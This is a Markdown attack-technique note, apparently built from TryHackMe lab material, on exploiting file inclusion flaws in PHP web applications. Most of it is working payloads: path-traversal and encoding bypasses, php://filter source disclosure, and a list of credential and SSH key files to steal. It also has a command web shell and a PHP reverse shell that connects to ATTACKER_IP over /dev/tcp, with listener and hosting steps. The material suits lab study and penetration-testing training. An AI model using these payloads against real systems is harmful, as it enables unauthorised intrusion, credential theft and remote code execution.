---
type: technique
platform: web
status: working
fluency: guided
source: thm
updated: 2026-08-30
---

# File Inclusion (LFI / RFI)

The application decides which file to load based on something you control. A `?page=about` parameter, a template name, a language file, a theme — anywhere a filename is assembled from input. Two outcomes sit behind the same bug: **[[Security-Terms#^lfi|LFI]]** reads files that already exist on the target, and **[[Security-Terms#^rfi|RFI]]** makes the target fetch and execute a file from a server you own.

The parameter names that give it away: `page`, `file`, `template`, `include`, `lang`, `view`, `doc`, `path`, `dir`. If a value looks like it becomes part of a path, this is the note.

## Prove the parameter reaches the filesystem

**Why now** — you have a parameter whose value looks like a filename. The one question that decides everything after this is whether traversal characters survive to the file open, and a file that exists on every host answers it in one request.

```text
page=../../../../../../../../etc/passwd
page=../../../../../../../../windows/system32/drivers/etc/hosts
page=....//....//....//....//etc/passwd
page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
page=/etc/passwd
```

- eight or more `../` → you do not know how deep the include path starts, and traversal past the filesystem root is harmless: `/` has no parent, so extra pairs are simply ignored. Using three and getting nothing is indistinguishable from not being vulnerable
- `/etc/passwd` with no traversal at all → tries the absolute-path case, where the application concatenates nothing in front of your value. One extra request, and it is occasionally the only one that works
- `....//` → defeats a filter that strips the literal string `../` **once**, non-recursively: removing the inner `../` from `....//` leaves `../` behind. The same idea as the nested-word trick in [[XSS]]
- `%2e%2e%2f` → URL-encoded traversal, for a filter that runs before decoding. Double encoding (`%252e%252e%252f`) covers the case where the value is decoded twice on its way in
- `/etc/passwd` and `windows/.../hosts` → pick the probe file by target OS; a Linux payload against IIS returns nothing and proves nothing

**What you will see**

- **Found** — `root:x:0:0:root:/root:/bin/bash` and the rest of the file rendered into the page, usually where the normal content would be. On Windows, the `hosts` file comment block. That is arbitrary file read, confirmed.
- **Empty** — a blank area where content should be, and it means three separable things. The parameter may not reach a file open at all, in which case this is a dead end. Or it does, but the application appends an extension (`page=../../etc/passwd` becomes `.../etc/passwd.php`) so your path never matched a real file — see the extension section. Or it reached the file and PHP *executed* it instead of printing it, which returns nothing visible for a text file and is handled by the `php://filter` section below. Do not conclude "not vulnerable" from a blank page.
- **Error** — the most useful outcome. `failed to open stream: No such file or directory in /var/www/html/index.php on line 12` hands you the vulnerable file, the line, and, in the message, the full path it tried — which tells you exactly how many `../` you need and whether an extension is being appended. `Warning: include(): Failed opening ... for inclusion` says the same. A 403 or 500 with no message is far less informative but still says your input changed the outcome.
- **Noise** — the application's own "page not found" template rendering normally means your value was handled by a whitelist and never reached a file open. Compare the response against a request with a deliberately absurd value: if they are identical, you are hitting a whitelist.

**Then** — a rendered `/etc/passwd` means you have arbitrary read; go to the file list below and then to [[Source-Code-Disclosure]]. An error naming a path is nearly as good — read the path and adjust. A blank page goes to the two ambiguity-resolving sections that follow, not to the next vulnerability class.

## When an extension is being appended

**Why now** — the error message showed `.php` glued onto your path, or you suspect it because every read comes back empty while errors prove the parameter reaches a file open. You need the extension gone, or you need a payload that does not care.

```text
page=../../../../etc/passwd%00
page=../../../../etc/passwd.
page=php://filter/convert.base64-encode/resource=../../../../etc/passwd
page=php://filter/convert.base64-encode/resource=index
```

- `%00` → null-byte truncation: the C string ends there and the appended `.php` never arrives. **Fixed in PHP 5.3.4, in 2010.** On anything modern this burns time for nothing, so try it once and move on rather than cycling variants of it
- trailing `.` or `/.` → path normalisation quirks that occasionally strip the suffix. Cheap to test, rarely works
- `php://filter/convert.base64-encode/resource=` → **the one that actually works**, and the most valuable payload in this note. The wrapper reads the file through a stream filter instead of including it, so PHP source comes back base64 encoded rather than being executed. It also survives the appended extension when you drop the extension from your own value (`resource=index` becomes `index.php`)
- decode locally: `base64 -d`. The output is server-side source, which is where the credentials, the database connection and the next vulnerability live

**What you will see**

- **Found** — a long base64 blob in the response. Decode it and you have the file. For `/etc/passwd` you get the same content as before; for `index.php` you get the source of the application itself, including the include logic you are attacking.
- **Empty** — an empty response to a `php://filter` payload usually means the file does not exist at that path, since the wrapper itself rarely fails silently. Adjust the path, not the payload. It can also mean `allow_url_include` is off *and* the PHP version restricts the wrapper, which is rare.
- **Error** — `failed to open stream: operation failed` on a `php://filter` URL means the wrapper is disabled or the path is wrong. `base64: invalid input` when decoding means you copied HTML around the blob as well; take only the base64 characters.
- **Noise** — a base64 blob that decodes to the *rendered* HTML rather than source means you read the wrong file, or the file genuinely contains no PHP.

**Then** — decoded source goes to [[Source-Code-Disclosure]] for the mining method and to [[Config-File-Looting]] for what to grep it for. Source of the vulnerable page itself tells you the exact filter you are fighting, which usually ends the guessing.

## Files worth reading once you have read

**Why now** — arbitrary read is a primitive, not a result. What converts it into access is knowing which files to ask for, and the useful ones are always the same handful.

```text
/etc/passwd                          usernames and shells
/etc/hosts                           other names this host knows
/proc/self/environ                   the web server's environment, sometimes credentials
/proc/self/cmdline                   how the server process was started
/var/log/apache2/access.log          the log-poisoning route to execution
/var/www/html/config.php             application credentials
/home/<user>/.ssh/id_rsa             a private key is a shell
/etc/apache2/sites-enabled/000-default.conf   the real document root and other vhosts
```

- `/proc/self/environ` → readable only as the process owner, and on many systems only when the reading process *is* the web server, which here it is. Worth trying early
- application config → you need the document root first, which the Apache config above gives you. Guessing `/var/www/html/` works often enough to try, but reading the config is the reliable way
- private keys → `id_rsa` is worth more than any password. Check `/home/*/` for each username `/etc/passwd` gave you
- log files → the bridge from read to execution: if you can write a PHP tag into a log the server later includes, it runs. The `User-Agent` header is the usual write channel

**What you will see**

- **Found** — file content rendered into the page. A private key, a database password, or a document root that reveals a second application.
- **Empty** — for `/proc/self/environ` and log files, empty most often means permissions rather than absence — the web user cannot read that path. That is a real closed door on this file and says nothing about the next one, so work down the list rather than stopping.
- **Error** — a path-not-found error confirms the read primitive still works and only this file is missing. That distinction matters: errors here are informative, blanks are ambiguous.
- **Noise** — reading a config file that turns out to contain only defaults or placeholders. Same discipline as [[Config-File-Looting]]: `changeme` and `your-password-here` are documentation.

**Then** — a credential goes to [[Authentication-Attacks]] and to the services on the host. A private key goes to SSH. Nothing useful readable means try to convert read into execution: RFI below, or log poisoning.

## Remote File Inclusion — execution from your own server

**Why now** — LFI reads; RFI runs. If the include accepts a URL, the target fetches your file and passes it through the PHP interpreter, which is direct code execution and skips the entire read-and-chain process. It is rare on modern targets, so establish the preconditions before spending time.

```php
<?php system($_GET["cmd"]); ?>
```

- a command web shell — anything passed as `?cmd=` runs and its output is printed
- requires **both** `allow_url_fopen` **and** `allow_url_include` to be `On`. `fopen` alone lets PHP *read* a remote URL; `include` is what lets it *execute* one. `allow_url_include` is `INI_SYSTEM` and defaults to `Off`, so finding it enabled is a deliberate misconfiguration, not drift
- deprecated as of **PHP 7.4.0**. It still exists in PHP 8 and emits a deprecation notice, and the manual lists no removal version — so RFI is *rare* on modern targets, not impossible. Do not write it off on version alone; check the directive itself via `phpinfo()` or a config leak
- unlike LFI, this executes a file that was never on the target — that is the whole difference

For a full reverse shell, the payload must be called from inside PHP:

```php
<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1'"); ?>
```

- the file is run through the PHP interpreter, so a raw `.sh` script will not execute. The shell command has to sit inside `system()` (or `shell_exec`, `exec`, `passthru`)
- `bash -c '...'` → runs the reverse-shell string as a bash command
- `bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1` → interactive bash piped over TCP; other languages in [[Shells]]
- start the listener **first**: `nc -lvnp 1337`. A shell that connects to nothing is a shell you do not get, and the request will simply appear to hang or fail

Host the payload from the directory it sits in, then trigger the include:

```bash
python3 -m http.server 80
```

```text
file=http://ATTACKER_IP/shell.php
```

- a full URL, not a filesystem path. The path is relative to your HTTP server's **root**, not to the file's location on your disk — `http://IP/shell.php`, never `http://IP/home/user/shell.php`
- add `:port` when the server is not on 80, and remember port 80 needs root locally
- name it `.php`, not `.sh`. **The most common single mistake in this section**

**What you will see**

- **Found** — for the web shell, command output rendered in the page. For the reverse shell, a connection on your listener. Your Python server's log showing a `GET /shell.php 200` from the target's address is the intermediate confirmation that the fetch happened.
- **Empty** — no request in your HTTP server log means the target never tried to fetch: either `allow_url_include` is off (the default, and the usual reason) or outbound is filtered. A request in the log but no shell means PHP fetched the file and did **not** execute it — which is `allow_url_fopen` on and `allow_url_include` off, exactly.
- **Error** — `URL file-access is disabled in the server configuration` is unambiguous: `allow_url_fopen` is off and RFI is closed on this host. `Deprecated: include(): Passing a URL is deprecated` in the response means it is still enabled and you are being warned, not blocked.
- **Noise** — your own browser fetching the payload while you test it. Check the source address in the Python server's log before celebrating.

**Then** — a shell goes to [[Shells]] to stabilise it into a TTY. `URL file-access is disabled` closes RFI permanently on this host, so go back to LFI and look for log poisoning or a readable credential instead. A fetch with no execution means the same thing and points the same way.

## Reading the output

The whole note turns on distinguishing three kinds of nothing, and the split is worth carrying: **not vulnerable**, **vulnerable but the path is wrong**, and **vulnerable but the output is suppressed**. An error message is the most valuable outcome here precisely because it collapses that ambiguity — a `failed to open stream` naming a full path tells you more than a successful read of `/etc/passwd` does, because it shows you the prefix, the suffix, and the depth all at once. Chase errors deliberately: send a value that cannot be a file and read what comes back.

The second point is that read and execute are different prizes and need different plans. Read gets you source, credentials and keys, and it chains — it is rarely the end of the box on its own. Execute ends the web phase immediately. When RFI is closed, the routes from read to execute are log poisoning, a writable upload directory included by path, and `/proc/self/environ`; when none of those exist, spend the read primitive on credentials and switch surface.

## Next

- [[Shells]] — the web-shell and reverse-shell payloads an include executes
- [[Command-Injection]] — sibling technique when the sink executes rather than includes
- [[Source-Code-Disclosure]] — `php://filter` reads source you can then mine for credentials

## Gaps

- Log poisoning is named but not worked: which log, which header, and what the payload has to survive to get there.
- Nothing on PHP session files (`/var/lib/php/sessions/sess_<id>`) as a write-then-include route, which is the other standard conversion from read to execute.
- No coverage of `zip://`, `phar://` or `data://` wrappers.
- Nothing on LFI outside PHP — Java path traversal and .NET file handlers behave differently and none of the wrapper tricks apply.
